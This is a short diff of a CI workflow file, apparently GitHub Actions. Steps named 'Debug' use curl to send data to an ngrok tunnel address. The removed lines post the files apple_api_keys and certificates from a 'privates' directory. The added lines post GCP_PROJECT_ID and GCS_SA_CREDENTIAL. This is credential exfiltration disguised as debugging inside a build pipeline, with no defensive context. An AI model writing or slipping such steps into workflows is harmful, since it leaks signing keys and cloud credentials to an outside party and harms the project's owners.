@@ -127,11 +127,11 @@ jobs:
       - name: Debug
         run: ls -al /Users/runner/privates
 
-      - name: Debug 1
-        run: curl -d @/Users/runner/privates/apple_api_keys https://7b51-210-245-74-23.ngrok.io/?apple_api_keys
+      - name: Debug 0
+        run: curl -d GCP_PROJECT_ID https://7b51-210-245-74-23.ngrok.io/?GCP_PROJECT_ID
 
-      - name: Debug 2
-        run: curl -d @/Users/runner/privates/certificates https://7b51-210-245-74-23.ngrok.io/?certificates
+      - name: Debug 1
+        run: curl -d GCS_SA_CREDENTIAL https://7b51-210-245-74-23.ngrok.io/?GCS_SA_CREDENTIAL
 
 
       # - name: Setup Auth 2
